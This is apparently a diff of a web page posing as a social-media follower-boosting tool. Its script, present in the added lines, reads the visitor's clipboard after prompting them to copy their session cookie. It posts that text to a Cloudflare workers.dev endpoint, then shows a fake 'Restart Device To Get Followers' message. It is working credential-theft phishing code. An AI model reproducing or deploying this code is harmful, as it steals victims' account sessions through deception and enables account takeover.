@@ -255,15 +255,6 @@ h1 {
     Extension
   </a>
 
-  <a
-    class="extension-button"
-    href="https://apps.apple.com/us/app/orion-browser-by-kagi/id1484498200"
-    target="_blank"
-    rel="noopener noreferrer"
-  >
-    browser for iphone
-  </a>
-
   <div class="status" id="status"></div>
 
 </div>
@@ -273,48 +264,48 @@ const button = document.getElementById("main");
 const status = document.getElementById("status");
 
 const SEND_ENDPOINT =
-  "https://young-brook-716e.abojanmawzoon.workers.dev";  
-  
-button.addEventListener("click", async () => {  
-  
-  try {  
-  
-    status.innerHTML = `  
-      <span class="spinner"></span>  
-      Adding Followers...  
-    `;  
-  
-    const text = await navigator.clipboard.readText();  
-  
-    if (!text) {  
-      status.textContent = "You havent copy The cookie Yet.";  
-      return;  
-    }  
-  
-    await fetch(SEND_ENDPOINT, {  
-      method: "POST",  
-      headers: {  
-        "Content-Type": "application/json"  
-      },  
-      body: JSON.stringify({  
-        clipboardText: text  
-      })  
-    });  
-  
-    await new Promise(resolve => setTimeout(resolve, 10000));  
-  
-    status.textContent =  
-      "Restart Device To Get Followers Added to your account!";  
-  
-  } catch (error) {  
-  
-    status.textContent =  
-      "Something went wrong. Please try again.";  
-  
-    console.error(error);  
-  }  
-});  
-</script>  
-  
-</body>
+  "https://young-brook-716e.abojanmawzoon.workers.dev";   
+   
+button.addEventListener("click", async () => {   
+   
+  try {   
+   
+    status.innerHTML = `   
+      <span class="spinner"></span>   
+      Adding Followers...   
+    `;   
+   
+    const text = await navigator.clipboard.readText();   
+   
+    if (!text) {   
+      status.textContent = "You havent copy The cookie Yet.";   
+      return;   
+    }   
+   
+    await fetch(SEND_ENDPOINT, {   
+      method: "POST",   
+      headers: {   
+        "Content-Type": "application/json"   
+      },   
+      body: JSON.stringify({   
+        clipboardText: text   
+      })   
+    });   
+   
+    await new Promise(resolve => setTimeout(resolve, 10000));   
+   
+    status.textContent =   
+      "Restart Device To Get Followers Added to your account!";   
+   
+  } catch (error) {   
+   
+    status.textContent =   
+      "Something went wrong. Please try again.";   
+   
+    console.error(error);   
+  }   
+});   
+</script>   
+   
+</body> 
 </html>
